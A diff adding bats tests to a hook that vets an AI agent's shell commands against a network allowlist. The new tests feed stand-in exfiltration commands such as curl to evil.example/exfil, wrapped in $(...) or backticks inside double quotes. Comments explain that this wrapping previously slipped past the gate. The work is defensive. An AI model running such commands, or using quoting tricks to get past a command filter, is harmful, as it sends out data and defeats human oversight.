@@ -684,6 +684,38 @@ _call_hook_other() {
   echo "$output" | jq -e '.decision == "block"'
 }
 
+@test "AC-2 (Codex CR3): \$(curl evil) INSIDE double quotes is BLOCKED" {
+  # Bash DOES expand $(...) inside "...". Previously the extractor
+  # treated double-quote interior as opaque (only closing-" + \\
+  # tracked), so `echo "$(curl evil.example)"` slipped past the
+  # gate. With expansion-aware tracking, the curl substitution body
+  # is now extracted + inspected as a synthetic segment.
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'echo "$(curl https://evil.example/exfil)"'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+  echo "$output" | jq -er '.reason' | grep -q 'evil.example'
+}
+
+@test "AC-2 (Codex CR3): backtick \`curl evil\` INSIDE double quotes is BLOCKED" {
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'echo "result is `curl https://evil.example/x`"'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (Codex CR3): \$(curl evil) INSIDE SINGLE quotes is NOT a bypass (literal)" {
+  # Single quotes are literal in bash — `echo '$(curl evil)'` prints
+  # the string verbatim, no expansion. So the gate should ALLOW (the
+  # curl never runs). Pin this so a future refactor that "fixes"
+  # single quotes the same way as double quotes doesn't false-block
+  # legitimate literal strings.
+  echo 'api.github.com' > "$ALLOWLIST"
+  run _call_hook_bash "echo 'curl https://evil.example/x is just a string'"
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
 # ---------------------------------------------------------------------------
 # Codex R3 CR2-B: `command` / `exec` / `builtin` shell builtins were
 # unwrapped → fell to ALLOW.
